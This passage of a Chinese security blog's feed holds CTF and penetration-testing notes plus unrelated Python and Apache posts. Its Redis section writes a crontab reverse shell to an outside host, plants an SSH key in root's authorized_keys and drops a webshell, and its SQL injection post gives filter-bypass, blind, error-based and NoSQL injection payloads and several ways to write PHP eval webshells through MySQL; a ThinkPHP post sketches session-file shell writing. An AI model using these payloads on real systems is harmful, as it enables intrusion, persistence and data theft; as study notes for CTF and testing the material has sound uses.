dbfilename redis.phpset webshell &quot;&lt;?php phpinfo(); ?&gt;&quot;save</code></pre><h3 id="写crontab反弹shell"><a href="#写crontab反弹shell" class="headerlink" title="写crontab反弹shell"></a>写crontab反弹shell</h3><p>在redis以root权限运行时可以写crontab来执行命令反弹shell</p><pre><code>root@kali:~# redis-cli -h 192.168.63.130192.168.63.130:6379&gt; set x &quot;\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.63.128/7999 0&gt;&amp;1\n&quot;OK192.168.63.130:6379&gt; config set dir /var/spool/cron/OK192.168.63.130:6379&gt; config set dbfilename rootOK192.168.63.130:6379&gt; saveOK</code></pre><h3 id="写ssh-keygen公钥"><a href="#写ssh-keygen公钥" class="headerlink" title="写ssh-keygen公钥"></a>写ssh-keygen公钥</h3><p>在以下条件下，可以利用此方法</p><ol><li>Redis服务使用ROOT账号启动</li><li>服务器开放了SSH服务，而且允许使用密钥登录，即可远程写入一个公钥，直接登录远程服务器。</li></ol><p><code>ssh-keygen -t rsa</code> 生成一对公私钥</p><p>然后redis执行命令，注意写入的公钥必须要前后分别加个换行</p><pre><code>192.168.63.130:6379&gt; config set dir /root/.ssh/OK192.168.63.130:6379&gt; config set dbfilename authorized_keysOK192.168.63.130:6379&gt; set x &quot;\n\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDKfxu58CbSzYFgd4BOjUyNSpbgpkzBHrEwH2/XD7rvaLFUzBIsciw9QoMS2ZPCbjO0IZL50Rro1478kguUuvQrv/RE/eHYgoav/k6OeyFtNQE4LYy5lezmOFKviUGgWtUrra407cGLgeorsAykL+lLExfaaG/d4TwrIj1sRz4/GeiWG6BZ8uQND9G+Vqbx/+zi3tRAz2PWBb45UXATQPvglwaNpGXVpI0dxV3j+kiaFyqjHAv541b/ElEdiaSadPjuW6iNGCRaTLHsQNToDgu92oAE2MLaEmOWuQz1gi90o6W1WfZfzmS8OJHX/GJBXAMgEgJhXRy2eRhSpbxaIVgx root@kali\n\n\n&quot;OK192.168.63.130:6379&gt; saveOK</code></pre><h3 id="主从复制"><a href="#主从复制" class="headerlink" title="主从复制"></a>主从复制</h3><h2 id="phpmyadmin常见漏洞"><a href="#phpmyadmin常见漏洞" class="headerlink" title="phpmyadmin常见漏洞"></a>phpmyadmin常见漏洞</h2><h3 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h3><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://xz.aliyun.com/t/256#toc-2" target="_blank" rel="noopener">https://xz.aliyun.com/t/256#toc-2</a></p><p><a href="https://paper.seebug.org/975/" target="_blank" rel="noopener">https://paper.seebug.org/975/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;msf常用命令&quot;&gt;&lt;a href=&quot;#msf常用命令&quot; class=&quot;headerlink&quot; title=&quot;msf常用命令&quot;&gt;&lt;/a&gt;msf常用命令&lt;/h2&gt;&lt;h3 id=&quot;msfvenom&quot;&gt;&lt;a href=&quot;#msfvenom&quot; class=&quot;headerli
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://prontosil.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="内网" scheme="http://prontosil.com/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>Laravel POP链讲解</title>
    <link href="http://prontosil.com/posts/898eeda9/"/>
    <id>http://prontosil.com/posts/898eeda9/</id>
    <published>2020-03-18T00:27:16.000Z</published>
    <updated>2020-03-18T00:45:48.519Z</updated>
    
    <content type="html"><![CDATA[<div style="position: relative; width: 100%; height: 0; padding-bottom: 75%;"><iframe src="//player.bilibili.com/player.html?aid=90514239&cid=154578272&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" height="480" width="780"> </iframe></div>]]></content>
    
    <summary type="html">
    
      
      
        

&lt;div style=&quot;position: relative; width: 100%; height: 0; padding-bottom: 75%;&quot;&gt;
&lt;iframe src=&quot;//player.bilibili.com/player.html?aid=90514239
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://prontosil.com/categories/CTF/"/>
    
    
      <category term="POP" scheme="http://prontosil.com/tags/POP/"/>
    
  </entry>
  
  <entry>
    <title>SQL注入总结</title>
    <link href="http://prontosil.com/posts/9b13a55/"/>
    <id>http://prontosil.com/posts/9b13a55/</id>
    <published>2020-03-17T14:35:41.000Z</published>
    <updated>2020-04-03T14:20:41.726Z</updated>
    
    <content type="html"><![CDATA[<h2 id="常用的绕过手段"><a href="#常用的绕过手段" class="headerlink" title="常用的绕过手段"></a>常用的绕过手段</h2><h3 id="字符型过滤单引号"><a href="#字符型过滤单引号" class="headerlink" title="字符型过滤单引号"></a>字符型过滤单引号</h3><ul><li>字符串转换函数绕过</li></ul><pre><code>char()</code></pre><ul><li>十六进制数绕过</li></ul><h3 id="过滤"><a href="#过滤" class="headerlink" title="过滤="></a>过滤=</h3><p>between, like, &lt;, &gt;，regexp 绕过</p><pre><code>1 union select 1, table_name from information_schema.tables where table_name = &#39;users&#39;select 1, table_name from information_schema.tables where table_name between &#39;u&#39; and &#39;v&#39;;select 1, table_name from information_schema.tables where table_name like &#39;u%&#39;;</code></pre><h3 id="注释符"><a href="#注释符" class="headerlink" title="注释符"></a>注释符</h3><pre><code># %23-- 后面要加空格/**/ 只加前半个也行;%00 Nullbyte` Backtick</code></pre><h3 id="过滤逗号"><a href="#过滤逗号" class="headerlink" title="过滤逗号"></a>过滤逗号</h3><p>在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号</p><pre><code>select substr(database() from 1 for 1);select mid(database() from 1 for 1);</code></pre><p>使用join(连接表的查询结果)</p><pre><code class="sql">union select 1,2     #等价于union select * from (select 1)a join (select 2)bmysql&gt; SELECT * FROM ((SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d JOIN (SELECT 5)e);+---+---+---+---+---+| 1 | 2 | 3 | 4 | 5 |+---+---+---+---+---+| 1 | 2 | 3 | 4 | 5 |+---+---+---+---+---+1 row in set (0.00 sec)</code></pre><p>使用like</p><pre><code class="sql">select ascii(mid(user(),1,1))=80   #等价于select user() like &#39;r%&#39;mysql&gt; select user() like &#39;r%&#39;;+------------------+| user() like &#39;r%&#39; |+------------------+|                1 |+------------------+1 row in set (0.00 sec)</code></pre><p>对于 <code>limit</code> 可以使用 offset绕过</p><pre><code class="sql">select * from news limit 0,1# 等价于下面这条SQL语句select * from news limit 1 offset 0</code></pre><h3 id="lt-，-gt-被过滤"><a href="#lt-，-gt-被过滤" class="headerlink" title="&lt;，&gt;被过滤"></a>&lt;，&gt;被过滤</h3><ul><li>greatest函数绕过</li></ul><blockquote><p>greatest(a,b)，返回a和b中较大的那个数</p></blockquote><pre><code># 猜解user()第一个字符的ascii码是否小于等于150时ascii(mid(user(),1,1)) &lt;= 150=greatest(ascii(mid(user(),1,1)), 150)=150;</code></pre><h3 id="过滤and，or可以使用-amp-amp-和"><a href="#过滤and，or可以使用-amp-amp-和" class="headerlink" title="过滤and，or可以使用&amp;&amp;和||"></a>过滤and，or可以使用&amp;&amp;和||</h3><h3 id="单引号逃逸"><a href="#单引号逃逸" class="headerlink" title="单引号逃逸"></a>单引号逃逸</h3><ul><li>\</li></ul><pre><code># 用户名为usernameSQL&gt; select * from db where name=&#39;username\&#39; and passwd=&#39; or 1=1#</code></pre><h3 id="注释符-1"><a href="#注释符-1" class="headerlink" title="注释符"></a>注释符</h3><pre><code># %23-- 后面要加空格/**/ 只加前半个也行;%00 Nullbyte` Backtick</code></pre><h3 id="过滤select"><a href="#过滤select" class="headerlink" title="过滤select"></a>过滤select</h3><p>利用数值计算盲注或时间盲注</p><pre><code>|| ascii(mid(user(),1,1) ) = 97 %23</code></pre><h3 id="绕过-information-被过滤"><a href="#绕过-information-被过滤" class="headerlink" title="绕过 information 被过滤"></a>绕过 information 被过滤</h3><ol><li>MySQL 5.7之后的版本，在其自带的 mysql 库中，新增了<code>innodb_table_stats</code> 和<code>innodb_index_stats</code>这两张日志表。如果数据表的引擎是innodb ，则会在这两张表中记录表、键的信息 。<br>如果waf掉了<code>information</code>我们可以利用这两个表注入数据库名和表名。</li><li>参考 <a href="https://www.anquanke.com/post/id/193512" target="_blank" rel="noopener">聊一聊bypass information_schema</a></li></ol><p>MySQl5.7的新特性</p><ul><li>sys.schema_auto_increment_columns  该视图的作用简单来说就是用来对表自增ID的监控。</li><li>schema_table_statistics_with_buffer,x$schema_table_statistics_with_buffer</li></ul><h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><h3 id="延时注入"><a href="#延时注入" class="headerlink" title="延时注入"></a>延时注入</h3><p>数据库如下</p><pre><code>mysql&gt; select * from user;+----+----------+----------------------------------+| id | username | password                         |+----+----------+----------------------------------+|  1 | zz       | 25ed1bcb423b0b7200f485fc5ff71c8e |+----+----------+----------------------------------+1 row in set (0.00 sec)</code></pre><p>测试</p><pre><code>mysql&gt; select password from user where id=1 and  (select hex(substr(database(), 1,1)) &gt; 20) and sleep(2);Empty set (2.00 sec)mysql&gt; select password from user where id=1 and  (select hex(substr(database(), 1,1)) &gt; 89) and sleep(2);Empty set (0.00 sec)</code></pre><p>我们这么来理解多语句的and</p><p>数据库会每次取出一行数据，然后做判断，首先 <code>id=1</code> 成立，然后 判断<code>(select hex(substr(database(), 1,1)) &gt; 20)</code> </p><p>如果这个成立，就会执行接下来的 <code>sleep(2)</code> 如果不成立，那么直接over了。不会有延时</p><h3 id="order-by-注入"><a href="#order-by-注入" class="headerlink" title="order by 注入"></a>order by 注入</h3><p>order by 后的数字可以作为一个注入点</p><p>报错注入</p><pre><code>mysql&gt; select * from flag order by 1 and (updatexml(1,concat(0x7e,(select user())),0));ERROR 1105 (HY000): XPATH syntax error: &#39;~root@localhost&#39;</code></pre><p>时间盲注</p><pre><code>select * from flag order by 1 and if(1=1,sleep(3), NULL);</code></pre><h3 id="limit-注入"><a href="#limit-注入" class="headerlink" title="limit 注入"></a>limit 注入</h3><p>在LIMIT后面可以跟两个函数，PROCEDURE 和 INTO，INTO除非有写入shell的权限，否则是无法利用的。</p><p>报错注入</p><pre><code>mysql&gt; select * from users where id&gt;1 order by id limit 1,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1); ERROR 1105 (HY000): XPATH syntax error: &#39;:5.5.53&#39;</code></pre><p>时间注入</p><pre><code>select * from users where id&gt;1 order by id limit 1,1 procedure analyse((select extractvalue (rand(),concat(0x3a,(IF(MID(version(),1,1) like 5,BENCHMARK(5000000,SHA1(1)),1))))),1);</code></pre><h2 id="无列名注入"><a href="#无列名注入" class="headerlink" title="无列名注入"></a>无列名注入</h2><p><a href="https://buuoj.cn/challenges#[SWPU2019]Web1" target="_blank" rel="noopener">例题链接</a></p><blockquote><p>过滤了空格和or，并且没办法绕过过滤or</p><p>同时不知道列名</p><p>payload: <code>1&#39;/**/union/**/select/**/1,(select/**/group_concat(b)/**/from(select/**/1,2/**/as/**/a,3/**/as/**/b/**/union/**/select*from/**/users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/&#39;</code></p></blockquote><p>这样在不知道列名的情况下，就可以给每一列取一个别名了</p><pre><code>mysql&gt; select 1,2,3 union select * from user;+---+-------+--------+| 1 | 2     | 3      |+---+-------+--------+| 1 | 2     | 3      || 1 | admin | mysql  || 2 | hhh   | 123    || 3 | aaaaa | cccccc |+---+-------+--------+4 rows in set (0.00 sec)</code></pre><p>查询</p><pre><code>mysql&gt; select group_concat(b) from (select 1,2,3 as b union select * from user)a;+--------------------+| group_concat(b)    |+--------------------+| 3,mysql,123,cccccc |+--------------------+1 row in set (0.00 sec)</code></pre><p>查询两列数据</p><pre><code>select concat(`2`,0x3a,`3`) from (select 1,2,3 union select * from users)a;</code></pre><p>查询一行数据</p><pre><code>select `2` from (select 1,2,3 union select * from users)a limit 1,1;</code></pre><p><a href="https://www.jianshu.com/p/6eba3370cfab" target="_blank" rel="noopener">无列名注入参考</a></p><p><strong>使用join进行无列名注入</strong></p><p>这样就能依次把列名都爆出来了</p><pre><code>mysql&gt; select * from user;+---------+-----------+-----------+| user_id | user_name | user_pass |+---------+-----------+-----------+|       1 | admin     | mysql     ||       2 | hhh       | 123       ||       3 | aaaaa     | cccccc    |+---------+-----------+-----------+3 rows in set (0.00 sec)mysql&gt; select*from (select * from user as a join user b)c;ERROR 1060 (42S21): Duplicate column name &#39;user_id&#39;mysql&gt; select*from (select * from user as a join user b using(user_id))c;ERROR 1060 (42S21): Duplicate column name &#39;user_name&#39;</code></pre><h2 id="nosql注入"><a href="#nosql注入" class="headerlink" title="nosql注入"></a>nosql注入</h2><p>以mongodb为例</p><pre><code>db.collection.find(query, projection)//query 可选，使用查询操作符指定查询条件//可选，使用投影操作符指定返回的键。查询时返回文档中所有键值， 只需省略该参数即可（默认省略）举例：//查找username为JrXnm的信息db.user.find({&#39;username&#39;:&#39;JrXnm&#39;}) </code></pre><p>第一种是按照语言的分类：php数组注入、js注入、mongo shell拼接注入。</p><p>第二种是按照攻击机制分类：永真式、联合查询、Js注入、盲注等。</p><p>PHP永真式注入</p><pre><code>$data = array(    &#39;username&#39; =&gt;  $_REQUEST[&#39;username&#39;],    &#39;password&#39; =&gt;  $_REQUEST[&#39;password&#39;]); $cursor = $collection-&gt;find($data);</code></pre><p>但是由于php松散结构的特性，如果我们_GET传入的是数组那么，会自动被解析成字典。比如我们输入<code>?username[$ne]=1&amp;password[$ne]=1</code>， 就会被解析成：</p><pre><code>{    &#39;username&#39;: {        &#39;$ne&#39;: &#39;1&#39;    },    &#39;password&#39;: {        &#39;$ne&#39;: &#39;1&#39;    }}</code></pre><p>这样就能查询到所有用户信息</p><p>Js注入</p><pre><code>$collection = $db-&gt;users;$query_body =&quot;        function q() {            var username = &#39;&quot;.$_REQUEST[&quot;username&quot;].&quot;&#39;;            var password = &#39;&quot;.$_REQUEST[&quot;password&quot;].&quot;&#39;;if(username == &#39;secret_user&#39;&amp;&amp;password == &#39;secret_password&#39;) return true; else{ return false;}}&quot;; $result = $collection-&gt;find(array(&#39;$where&#39;=&gt;$query_body));$count = $result-&gt;count();if($count&gt;0){    echo $doc_succeed-&gt;saveHTML();}</code></pre><p><code>$where</code>操作符表示执行其中的Js内容，返回True的话返回所有内容。</p><p>我们可以看到我们可以注入使得Js代码提前返回True</p><p>payload：<code>?username=qwer&amp;password= 1&#39;;return true;var qwer=&#39;1</code></p><h2 id="MySQL利用方式"><a href="#MySQL利用方式" class="headerlink" title="MySQL利用方式"></a>MySQL利用方式</h2><h3 id="写shell"><a href="#写shell" class="headerlink" title="写shell"></a>写shell</h3><h4 id="联合查询写shell"><a href="#联合查询写shell" class="headerlink" title="联合查询写shell"></a>联合查询写shell</h4><pre><code>UNION+ALL+SELECT+1,2,’&lt;? phpinfo(); ?&gt;’ into outfile ‘G:/2.txt’ %23</code></pre><h4 id="非联合查询写shell"><a href="#非联合查询写shell" class="headerlink" title="非联合查询写shell"></a>非联合查询写shell</h4><pre><code>http://127.0.0.1/sqli-labs-master/Less-2/?id=1 into outfile ‘G:/2.txt’ fields terminated by ‘&lt;? phpinfo(); ?&gt;’%23</code></pre><h4 id="使用日志写shell"><a href="#使用日志写shell" class="headerlink" title="使用日志写shell"></a>使用日志写shell</h4><pre><code class="p">set global general_log = on;开启日志监测，一般是关闭的，如果一直开，文件会很大的。set global general_log_file = ‘G:/2.txt’;这里设置我们需要写入的路径就可以了。select ‘&lt;?php eval($_POST[‘shiyan’]);?&gt;’;查询一个一句话，这个时候log日志里就会记录这个。set global general_log_file = ‘D:\xampp\mysql\data\LAPTOP-SO1V6ABB.log’;结束后，再修改为原来的路径。set global general_log = off;关闭下日志记录。</code></pre><h4 id="延时注入写shell"><a href="#延时注入写shell" class="headerlink" title="延时注入写shell"></a>延时注入写shell</h4><pre><code>select sleep(2),&#39;&lt;?php @eval($_POST[cmd]); ?&gt;&#39; into outfile &#39;d:\\success.txt&#39;;</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;常用的绕过手段&quot;&gt;&lt;a href=&quot;#常用的绕过手段&quot; class=&quot;headerlink&quot; title=&quot;常用的绕过手段&quot;&gt;&lt;/a&gt;常用的绕过手段&lt;/h2&gt;&lt;h3 id=&quot;字符型过滤单引号&quot;&gt;&lt;a href=&quot;#字符型过滤单引号&quot; class=&quot;headerli
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://prontosil.com/categories/CTF/"/>
    
    
      <category term="SQL注入" scheme="http://prontosil.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>python数据结构</title>
    <link href="http://prontosil.com/posts/7f8e2ad4/"/>
    <id>http://prontosil.com/posts/7f8e2ad4/</id>
    <published>2020-03-17T13:29:33.000Z</published>
    <updated>2020-03-17T14:14:47.958Z</updated>
    
    <content type="html"><![CDATA[<p>补充一个小知识</p><p>python 输入重定向为文件</p><pre><code>import syssys.stdin = open(&quot;test.txt&quot;)</code></pre><p>之后就可以直接从文件读入，不需要手动输入了</p><h2 id="链表"><a href="#链表" class="headerlink" title="链表"></a>链表</h2><pre><code>实现链表输入1 3 5 4 1 9 4 将其存储为链表格式</code></pre><p>链表数据结构：</p><pre><code class="python">class ListNode:    def __init__(self, x=-1):        self.val = x        self.next = None</code></pre><h3 id="创建链表，返回头节点-尾插法"><a href="#创建链表，返回头节点-尾插法" class="headerlink" title="创建链表，返回头节点 (尾插法)"></a>创建链表，返回头节点 (尾插法)</h3><pre><code class="python">def creat_list(line:list) -&gt; ListNode:    root = ListNode()    tail = root    for i in line:        temp = ListNode(i)        tail.next = temp        tail = tail.next      return root.next</code></pre><h3 id="遍历链表"><a href="#遍历链表" class="headerlink" title="遍历链表"></a>遍历链表</h3><pre><code class="python">def traverse_list(root:ListNode):    &#39;&#39;&#39;    遍历链表，没有头节点    &#39;&#39;&#39;    temp = root    while temp:        print(temp.val+&quot; &quot;,end=&quot;&quot;)        temp = temp.next    print()</code></pre><h3 id="删除倒数第n个节点，一次遍历"><a href="#删除倒数第n个节点，一次遍历" class="headerlink" title="删除倒数第n个节点，一次遍历"></a>删除倒数第n个节点，一次遍历</h3><p>用两个指针指向，第一个指针先走 <code>n+1</code> 步，中间空出n个节点，然后删除即可</p><pre><code class="python">def removeNthFromEnd(head:ListNode, n:int)-&gt;ListNode:    &#39;&#39;&#39;    一次遍历算法    &#39;&#39;&#39;    new_head = ListNode(-1)    new_head.next = head    first = new_head    second = new_head    for i in range(n+1):        first = first.next        while first != None:        first = first.next        second = second.next    second.next = second.next.next    return new_head.next</code></pre><h3 id="向右旋转链表"><a href="#向右旋转链表" class="headerlink" title="向右旋转链表"></a>向右旋转链表</h3><p>就是把单链表组成一个循环链表</p><pre><code class="python">def rotateRight(head:ListNode, k:int)-&gt;ListNode:    &#39;&#39;&#39;    针对链表进行旋转    &#39;&#39;&#39;    if k == 0:        return head    if head == None:        return head    temp = head    length = 0    while temp.next != None:        length += 1        temp = temp.next    length += 1    temp.next = head    temp = head    for i in range((length - k%length -1)):        temp = temp.next    new_head = temp.next    temp.next = None    return new_head</code></pre><h2 id="图"><a href="#图" class="headerlink" title="图"></a>图</h2><h3 id="创建图"><a href="#创建图" class="headerlink" title="创建图"></a>创建图</h3><p>采用邻接表进行存储， <code>ArcNode</code> 代表邻接点， <code>VNode</code> 代表边节点</p><pre><code class="python">class ArcNode:    def __init__(self,adjvex, weight):        self.adjvex = adjvex        self.weight = weight        self.next = Noneclass VNode:    def __init__(self):        self.next = None</code></pre><p>输入数据</p><pre><code>输入格式：4 40 1 1 01 0 1 01 1 0 11 1 1 1</code></pre><p>读入数据，创建邻接矩阵</p><pre><code class="python">def create_table()-&gt;list:    m,n = [int(i) for i in input().split()] # 自动解包    A = [0 for i in range(m)]    for i in range(m):        A[i] = [int(j) for j in input().split()]    return A</code></pre><p>邻接矩阵转换为邻接表</p><pre><code class="python">def create_Adj(A)-&gt;list:    &#39;&#39;&#39;    邻接矩阵转换为邻接表    &#39;&#39;&#39;    G = [VNode() for i in range(len(A))]    for i,vex in enumerate(A):        # 第i个节点，及其所有的边        for node,j in enumerate(vex):            if j != 0:                p = ArcNode(node, j)                p.next = G[i].next                G[i].next = p    return G</code></pre><p>打印邻接表</p><pre><code class="python">def disp_adj(G):    for index,i in enumerate(G):        p = i.next        print(index, end=&quot;&quot;)        while p != None:            print(&quot; {}-&gt;&quot;.format(p.adjvex), end=&quot;&quot;)            p = p.next        print()</code></pre><h3 id="深度优先搜索"><a href="#深度优先搜索" class="headerlink" title="深度优先搜索"></a>深度优先搜索</h3><pre><code class="python">visited = [0 for i in range(4)]def DFS(G, v):    &#39;&#39;&#39;    深度优先搜索    &#39;&#39;&#39;    visited[v] = 1    print(v, end=&quot;&quot;)    p = G[v].next    while p != None:        w = p.adjvex        if visited[w] == 0:            DFS(G,w)        p = p.next    print()</code></pre><h3 id="广度优先搜索"><a href="#广度优先搜索" class="headerlink" title="广度优先搜索"></a>广度优先搜索</h3><pre><code class="python">def BFS(G, v):    &#39;&#39;&#39;    广度优先搜索    &#39;&#39;&#39;    q = Queue()    visited = [0 for i in range(len(G))]    print(v,end=&quot;&quot;)    visited[v] = 1    q.put(v)    while not q.empty():        w = q.get()        p = G[w].next        while p!=None:            if visited[p.adjvex] == 0:                print(p.adjvex, end=&quot;&quot;)                visited[p.adjvex] = 1                q.put(p.adjvex)            p = p.next    print()</code></pre><h3 id="Dijkstar-算法"><a href="#Dijkstar-算法" class="headerlink" title="Dijkstar 算法"></a>Dijkstar 算法</h3><pre><code class="python">def Dijkstra(A, v):    &#39;&#39;&#39;    Dijkstar 算法    &#39;&#39;&#39;    for i in A:        for index,value in enumerate(i):            if value == -1:                i[index] = sys.maxsize    dist = A[v] # 原始v到各个顶点的距离    path = [0 for i in range(len(A))]     for i in range(len(A)):        if A[v][i] != -1:            path[i] = v        else:            path[i] = -1    s = [0 for i in range(len(A))]    s[v] = 1    for i in range(len(A)):        mindis = sys.maxsize        # 寻找最小路径长度顶点u        for j in range(len(A)):            if s[j] == 0  and dist[j] &lt; mindis:                u = j                mindis = dist[j]        s[u] = 1        for j in range(len(A)):            if s[j] == 0:                if A[u][j] &lt; sys.maxsize and dist[j] &gt; 0 and dist[u]+A[u][j] &lt; dist[j]:                    dist[j] = dist[u] + A[u][j]                    path[j] = u    return path, dist</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;补充一个小知识&lt;/p&gt;
&lt;p&gt;python 输入重定向为文件&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;import sys

sys.stdin = open(&amp;quot;test.txt&amp;quot;)&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;之后就可以直接从文件读入，不需要手动输入了&lt;/p&gt;
      
    
    </summary>
    
    
      <category term="编程" scheme="http://prontosil.com/categories/%E7%BC%96%E7%A8%8B/"/>
    
    
      <category term="python" scheme="http://prontosil.com/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>thinkphp6.0漏洞分析</title>
    <link href="http://prontosil.com/posts/314a66d3/"/>
    <id>http://prontosil.com/posts/314a66d3/</id>
    <published>2020-03-17T12:33:18.000Z</published>
    <updated>2020-03-17T14:14:47.961Z</updated>
    
    <content type="html"><![CDATA[<h2 id="通过session写文件"><a href="#通过session写文件" class="headerlink" title="通过session写文件"></a>通过session写文件</h2><p>漏洞点位于：<code>/think/session/Store.php</code></p><pre><code class="php">    /**     * session_id设置     * @access public     * @param string $id session_id     * @return void     */    public function setId($id = null): void    {        $this-&gt;id = is_string($id) &amp;&amp; strlen($id) === 32 ? $id : md5(microtime(true) . session_create_id());    }</code></pre><p>针对sessionid的校验不严</p><p><img src="/posts/314a66d3/1584448906099.png" alt></p><p>之后初始化session</p><p><img src="/posts/314a66d3/1584448927094.png" alt></p><p>保存session的过程： <code>think/session/Store.php</code></p><pre><code class="php">    /**     * 保存session数据     * @access public     * @return void     */    public function save(): void    {        $this-&gt;clearFlashData();        $sessionId = $this-&gt;getId();        if (!empty($this-&gt;data)) {            $data = $this-&gt;serialize($this-&gt;data);            $this-&gt;handler-&gt;write($sessionId, $data);        } else {            $this-&gt;handler-&gt;delete($sessionId);        }        $this-&gt;init = false;    }</code></pre><p>进入到 <code>write</code> 函数写入</p><p>最后存储到文件中</p><p><img src="/posts/314a66d3/1584449025846.png" alt></p><p>这样，如果我能控制session的数组中的某个值，就能直接写入shell</p><p>成功写入：</p><p><img src="/posts/314a66d3/1584449183704.png" alt></p><h2 id="6-0-POP链分析"><a href="#6-0-POP链分析" class="headerlink" title="6.0 POP链分析"></a>6.0 POP链分析</h2><p>入口</p><p><img src="/posts/314a66d3/1584451502585.png" alt></p><p>进入 <code>save</code> 函数</p><p><img src="/posts/314a66d3/1584451535191.png" alt></p><p>继续步入</p><p><img src="/posts/314a66d3/1584451560678.png" alt></p><p>进入到 <code>cleanContents</code> 函数，直接返回原值(没有过滤因为不是多维数组)</p><pre><code class="php">    public function cleanContents(array $contents)    {        $cachedProperties = array_flip([            &#39;path&#39;, &#39;dirname&#39;, &#39;basename&#39;, &#39;extension&#39;, &#39;filename&#39;,            &#39;size&#39;, &#39;mimetype&#39;, &#39;visibility&#39;, &#39;timestamp&#39;, &#39;type&#39;,        ]);        foreach ($contents as $path =&gt; $object) {            if (is_array($object)) {                $contents[$path] = array_intersect_key($object, $cachedProperties);            }        }        return $contents;    }</code></pre><p>返回</p><p><img src="/posts/314a66d3/1584451622290.png" alt></p><p>跟进 <code>set</code> 函数，这里的 <code>$this-&gt;store</code> 已经被覆盖为 File 类</p><p><img src="/posts/314a66d3/1584451656966.png" alt></p><p><img src="/posts/314a66d3/1584451671730.png" alt></p><p>最后有两个利用方式：</p><ol><li><pre><code class="php"> protected function serialize($data): string {     if (is_numeric($data)) {         return (string) $data;     }     $serialize = $this-&gt;options[&#39;serialize&#39;][0] ?? &quot;\Opis\Closure\serialize&quot;;     return $serialize($data); }</code></pre></li></ol><ol start="2"><li><p>利用伪协议任意文件写入</p></li></ol><p><img src="/posts/314a66d3/1584451721156.png" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;通过session写文件&quot;&gt;&lt;a href=&quot;#通过session写文件&quot; class=&quot;headerlink&quot; title=&quot;通过session写文件&quot;&gt;&lt;/a&gt;通过session写文件&lt;/h2&gt;&lt;p&gt;漏洞点位于：&lt;code&gt;/think/session/Sto
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://prontosil.com/categories/CTF/"/>
    
    
      <category term="thinkphp" scheme="http://prontosil.com/tags/thinkphp/"/>
    
  </entry>
  
  <entry>
    <title>apache配置文件简单记录</title>
    <link href="http://prontosil.com/posts/a3f2ee6b/"/>
    <id>http://prontosil.com/posts/a3f2ee6b/</id>
    <published>2020-03-14T13:23:42.000Z</published>
    <updated>2020-03-15T11:42:38.520Z</updated>
    
    <content type="html"><![CDATA[<p>一直不太清楚apache的配置文件，简单记录一下</p><p><code>/etc/apache2</code> 下的文件</p><p><code>apache2.conf</code> 是主配置文件，之后的 <code>available</code> 代表可用的, <code>enable</code> 代表已经启用的</p><p><img src="/posts/a3f2ee6b/1584192313504.png" alt></p><p><code>sites-enabled</code> 下</p><p><img src="/posts/a3f2ee6b/1584192394696.png" alt></p><p>000-default.conf 文件规定了网站根目录</p><pre><code>&lt;VirtualHost *:80&gt;        # The ServerName directive sets the request scheme, hostname and port that        # the server uses to identify itself. This is used when creating        # redirection URLs. In the context of virtual hosts, the ServerName        # specifies what hostname must appear in the request&#39;s Host: header to        # match this virtual host. For the default virtual host (this file) this        # value is not decisive as it is used as a last resort host regardless.        # However, you must set it for any further virtual host explicitly.        #ServerName www.example.com        ServerAdmin webmaster@localhost        DocumentRoot /var/www/html        # Available loglevels: trace8, ..., trace1, debug, info, notice, warn,        # error, crit, alert, emerg.        # It is also possible to configure the loglevel for particular        # modules, e.g.        #LogLevel info ssl:warn        ErrorLog ${APACHE_LOG_DIR}/error.log        CustomLog ${APACHE_LOG_DIR}/access.log combined        # For most configuration files from conf-available/, which are        # enabled or disabled at a global level, it is possible to        # include a line for only one particular virtual host. For example the        # following line enables the CGI configuration for this host only        # after it has been globally disabled with &quot;a2disconf&quot;.        #Include conf-available/serve-cgi-bin.conf&lt;/VirtualHost&gt;# vim: syntax=apache ts=4 sw=4 sts=4 sr noet</code></pre><p><code>/etc/apache2/mods-enabled /mime.conf</code> 中配置了可以解析的文件类型</p><p><img src="/posts/a3f2ee6b/1584192584702.png" alt></p><p>这样就能解析 php5 等的后缀了</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;一直不太清楚apache的配置文件，简单记录一下&lt;/p&gt;
&lt;p&gt;&lt;code&gt;/etc/apache2&lt;/code&gt; 下的文件&lt;/p&gt;
&lt;p&gt;&lt;code&gt;apache2.conf&lt;/code&gt; 是主配置文件，之后的 &lt;code&gt;available&lt;/code&gt; 代表可用的, 
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://prontosil.com/categories/CTF/"/>
    
    
      <category term="apache" scheme="http://prontosil.com/tags/apache/"/>
    
  </entry>
  
</feed>
